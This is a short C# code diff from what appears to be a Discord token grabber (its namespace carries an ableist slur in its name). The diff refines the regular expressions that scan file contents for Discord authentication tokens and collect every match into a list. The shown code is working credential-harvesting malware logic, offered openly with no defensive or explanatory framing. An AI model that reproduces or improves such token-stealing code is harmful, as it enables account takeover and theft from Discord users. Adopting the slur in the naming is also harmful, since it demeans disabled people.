@@ -34,7 +34,11 @@ namespace retardGrabber
             {
                 string readedfile = file.OpenText().ReadToEnd();
 
-                foreach (Match match in Regex.Matches(readedfile, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
+                foreach (Match match in Regex.Matches(readedfile, @"N[\w-]{23}\.[\w-]{6}\.[\w-]{27}"))
+                {
+                    discordtokens.Add(match.Value + "\n");
+                }
+                foreach (Match match in Regex.Matches(readedfile, @"O[\w-]{23}\.[\w-]{6}\.[\w-]{27}"))
                 {
                     discordtokens.Add(match.Value + "\n");
                 }
